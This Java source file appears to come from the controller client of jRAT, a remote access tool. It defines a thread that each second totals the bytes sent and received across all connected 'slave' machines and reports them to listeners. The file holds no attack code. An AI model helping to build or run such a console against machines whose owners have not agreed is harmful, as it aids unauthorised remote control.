package se.jrat.client.threads;

import java.util.ArrayList;
import java.util.List;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.listeners.NetworkMonitorListener;

public class RunnableNetworkCounter implements Runnable {
	
	private static final List<NetworkMonitorListener> listeners = new ArrayList<NetworkMonitorListener>();
	
	@Override
	public void run() {
		try {
			while (true) {
				Thread.sleep(1000L);

				int in = 0;
				int out = 0;
				
				for (AbstractSlave slave : Main.connections) {
					in += slave.getCountingInputStream().getCount();
					out += slave.getCountingOutputStream().getCount();
				}
				
				for (NetworkMonitorListener listener : listeners) {
					listener.onUpdate(in, out);
				}
							
				for (AbstractSlave slave : Main.connections) {
					slave.getCountingInputStream().reset();
					slave.getCountingOutputStream().reset();
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void addListener(NetworkMonitorListener listener) {
		listeners.add(listener);
	}
	
	public void removeListener(NetworkMonitorListener listener) {
		listeners.remove(listener);
	}
}
